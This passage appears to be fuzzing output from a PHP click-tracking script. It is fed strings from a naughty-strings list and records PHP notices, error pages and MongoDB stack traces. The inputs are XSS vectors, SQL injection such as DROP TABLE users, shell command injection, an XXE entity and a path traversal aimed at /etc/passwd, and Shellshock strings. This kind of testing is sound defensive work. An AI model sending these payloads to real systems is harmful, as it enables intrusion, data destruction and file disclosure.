+  [1]=>
+  string(59) "%3Cimg%20%5Cx00src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src%5Cx09=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src%5Cx10=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src%5Cx13=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src%5Cx32=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src%5Cx12=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src%5Cx11=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src%5Cx00=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src%5Cx47=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%20src=x%5Cx09onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%20src=x%5Cx10onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%20src=x%5Cx11onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%20src=x%5Cx12onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%20src=x%5Cx13onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(54) "%3Cimg[a][b][c]src[d]=x[e]onerror=[f]%22alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src=x%20onerror=%5Cx09%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src=x%20onerror=%5Cx10%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src=x%20onerror=%5Cx11%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src=x%20onerror=%5Cx12%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src=x%20onerror=%5Cx32%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20src=x%20onerror=%5Cx00%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(17) "%3Ca%20href=java&"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(60) "%3Cimg%20src=%22x%60%20%60%3Cscript%3Ejavascript:alert(1)%3C"
+  [2]=>
+  string(24) "script%3E%22%60%20%60%3E"
+}
+No record found=============================array(5) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(25) "%3Cimg%20src%20onerror%20"
+  [2]=>
+  string(37) "%22%20'%22=%20alt=javascript:alert(1)"
+  [3]=>
+  string(0) ""
+  [4]=>
+  string(6) "%22%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(53) "%3Ctitle%20onpropertychange=javascript:alert(1)%3E%3C"
+  [2]=>
+  string(28) "title%3E%3Ctitle%20title=%3E"
+}
+No record found=============================array(5) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(17) "%3Ca%20href=http:"
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(7) "foo.bar"
+  [4]=>
+  string(0) ""
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(47) "%3C!--[if]%3E%3Cscript%3Ejavascript:alert(1)%3C"
+  [2]=>
+  string(14) "script%20--%3E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(53) "%3C!--[if%3Cimg%20src=x%20onerror=javascript:alert(1)"
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(12) "]%3E%20--%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================400 Bad Request=============================400 Bad Request=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(52) "%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C"
+  [2]=>
+  string(15) "SCRIPT%3E%22%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(63) "%3CIMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(13) "%3CIMG%20SRC="
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(49) "%3CIMG%20SRC=%20onmouseover=%22alert('xxs')%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(42) "%3CIMG%20onmouseover=%22alert('xxs')%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(14) "%3CIMG%20SRC=&"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(14) "%3CIMG%20SRC=&"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(14) "%3CIMG%20SRC=&"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(55) "%3CIMG%20SRC=%22jav%20%20%20ascript:alert('XSS');%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(20) "%3CIMG%20SRC=%22jav&"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(20) "%3CIMG%20SRC=%22jav&"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(20) "%3CIMG%20SRC=%22jav&"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(94) "perl%20-e%20'print%20%22%3CIMG%20SRC=java%5C0script:alert(%5C%22XSS%5C%22)%3E%22;'%20%3E%20out"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(20) "%3CIMG%20SRC=%22%20&"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(7) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(9) "%3CSCRIPT"
+  [2]=>
+  string(18) "XSS%20SRC=%22http:"
+  [3]=>
+  string(0) ""
+  [4]=>
+  string(12) "ha.ckers.org"
+  [5]=>
+  string(15) "xss.js%22%3E%3C"
+  [6]=>
+  string(9) "SCRIPT%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(17) "%3CBODY%20onload!"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(7) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(9) "%3CSCRIPT"
+  [2]=>
+  string(12) "SRC=%22http:"
+  [3]=>
+  string(0) ""
+  [4]=>
+  string(12) "ha.ckers.org"
+  [5]=>
+  string(15) "xss.js%22%3E%3C"
+  [6]=>
+  string(9) "SCRIPT%3E"
+}
+No record found=============================array(5) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(32) "%3C%3CSCRIPT%3Ealert(%22XSS%22);"
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(6) "%3C%3C"
+  [4]=>
+  string(9) "SCRIPT%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(5) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(21) "%3CSCRIPT%20SRC=http:"
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(12) "ha.ckers.org"
+  [4]=>
+  string(20) "xss.js?%3C%20B%20%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(5) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(16) "%3CSCRIPT%20SRC="
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(12) "ha.ckers.org"
+  [4]=>
+  string(5) ".j%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(42) "%3CIMG%20SRC=%22javascript:alert('XSS')%22"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(5) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(21) "%3Ciframe%20src=http:"
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(12) "ha.ckers.org"
+  [4]=>
+  string(20) "scriptlet.html%20%3C"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(20) "%5C%22;alert('XSS');"
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(0) ""
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(39) "%3Cu%20oncopy=alert()%3E%20Copy%20me%3C"
+  [2]=>
+  string(4) "u%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(53) "%3Ci%20onwheel=alert(1)%3E%20Scroll%20over%20me%20%3C"
+  [2]=>
+  string(4) "i%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(15) "%3Cplaintext%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /http://a/ was not found on this server.</p>
+</body></html>
+=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "%3C"
+  [2]=>
+  string(36) "textarea%3E%3Cscript%3Ealert(123)%3C"
+  [3]=>
+  string(9) "script%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(22) "1;DROP%20TABLE%20users"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(32) "1';%20DROP%20TABLE%20users--%201"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(21) "'%20OR%201=1%20--%201"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(15) "'%20OR%20'1'='1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "';%20EXEC%20sp_MSForEachTable%20'DROP%20TABLE%20?';%20--"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "%20"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================400 Bad Request=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "_"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "-"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "--"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(9) "--version"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "--help"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "$USER"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(6) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(0) ""
+  [2]=>
+  string(3) "dev"
+  [3]=>
+  string(16) "null;%20touch%20"
+  [4]=>
+  string(3) "tmp"
+  [5]=>
+  string(20) "blns.fail%20;%20echo"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(11) "%60touch%20"
+  [2]=>
+  string(3) "tmp"
+  [3]=>
+  string(12) "blns.fail%60"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(10) "$(touch%20"
+  [2]=>
+  string(3) "tmp"
+  [3]=>
+  string(10) "blns.fail)"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(25) "@%7B[system%20%22touch%20"
+  [2]=>
+  string(3) "tmp"
+  [3]=>
+  string(16) "blns.fail%22]%7D"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(34) "eval(%22puts%20'hello%20world'%22)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(21) "System(%22ls%20-al%20"
+  [2]=>
+  string(4) "%22)"
+}
+<br />
+<b>Fatal error</b>:  Uncaught MongoDB\Driver\Exception\CommandException: Regular expression is invalid: unmatched parentheses in /var/www/html/vendor/mongodb/mongodb/src/Operation/Find.php:299
+Stack trace:
+#0 /var/www/html/vendor/mongodb/mongodb/src/Operation/Find.php(299): MongoDB\Driver\Server-&gt;executeQuery('sendplex.sms_hi...', Object(MongoDB\Driver\Query), Array)
+#1 /var/www/html/vendor/mongodb/mongodb/src/Operation/FindOne.php(126): MongoDB\Operation\Find-&gt;execute(Object(MongoDB\Driver\Server))
+#2 /var/www/html/vendor/mongodb/mongodb/src/Collection.php(657): MongoDB\Operation\FindOne-&gt;execute(Object(MongoDB\Driver\Server))
+#3 /var/www/html/click.php(48): MongoDB\Collection-&gt;findOne(Array)
+#4 {main}
+  thrown in <b>/var/www/html/vendor/mongodb/mongodb/src/Operation/Find.php</b> on line <b>299</b><br />
+=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(14) "%60ls%20-al%20"
+  [2]=>
+  string(3) "%60"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(26) "Kernel.exec(%22ls%20-al%20"
+  [2]=>
+  string(4) "%22)"
+}
+<br />
+<b>Fatal error</b>:  Uncaught MongoDB\Driver\Exception\CommandException: Regular expression is invalid: unmatched parentheses in /var/www/html/vendor/mongodb/mongodb/src/Operation/Find.php:299
+Stack trace:
+#0 /var/www/html/vendor/mongodb/mongodb/src/Operation/Find.php(299): MongoDB\Driver\Server-&gt;executeQuery('sendplex.sms_hi...', Object(MongoDB\Driver\Query), Array)
+#1 /var/www/html/vendor/mongodb/mongodb/src/Operation/FindOne.php(126): MongoDB\Operation\Find-&gt;execute(Object(MongoDB\Driver\Server))
+#2 /var/www/html/vendor/mongodb/mongodb/src/Collection.php(657): MongoDB\Operation\FindOne-&gt;execute(Object(MongoDB\Driver\Server))
+#3 /var/www/html/click.php(48): MongoDB\Collection-&gt;findOne(Array)
+#4 {main}
+  thrown in <b>/var/www/html/vendor/mongodb/mongodb/src/Operation/Find.php</b> on line <b>299</b><br />
+=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(14) "Kernel.exit(1)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================400 Bad Request=============================array(7) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(148) "%3C?xml%20version=%221.0%22%20encoding=%22ISO-8859-1%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file:"
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(0) ""
+  [4]=>
+  string(3) "etc"
+  [5]=>
+  string(36) "passwd%22%20%3E]%3E%3Cfoo%3E&xxe;%3C"
+  [6]=>
+  string(6) "foo%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "$HOME"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(16) "$ENV%7B'HOME'%7D"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================400 Bad Request=============================400 Bad Request=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(7) "%7B0%7D"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================400 Bad Request=============================400 Bad Request=============================400 Bad Request=============================array(5) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "File:"
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(0) ""
+  [4]=>
+  string(0) ""
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /../../../../../../../../../../../etc/passwd was not found on this server.</p>
+</body></html>
+=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+</body></html>
+=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(31) "()%20%7B%200;%20%7D;%20touch%20"
+  [2]=>
+  string(3) "tmp"
+  [3]=>
+  string(22) "blns.shellshock1.fail;"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(51) "()%20%7B%20_;%20%7D%20%3E_[$($())]%20%7B%20touch%20"
+  [2]=>
+  string(3) "tmp"
+  [3]=>
+  string(28) "blns.shellshock2.fail;%20%7D"
+}
+No record found=============================400 Bad Request=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(7) "+++ATH0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "CON"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "PRN"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "AUX"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "CLOCK$"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "NUL"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "A:"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "ZZ:"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "COM1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "LPT1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "LPT2"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "LPT3"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "COM2"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "COM3"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "COM4"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(39) "DCC%20SEND%20STARTKEYLOGGER%200%200%200"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(31) "Scunthorpe%20General%20Hospital"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(30) "Penistone%20Community%20Church"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
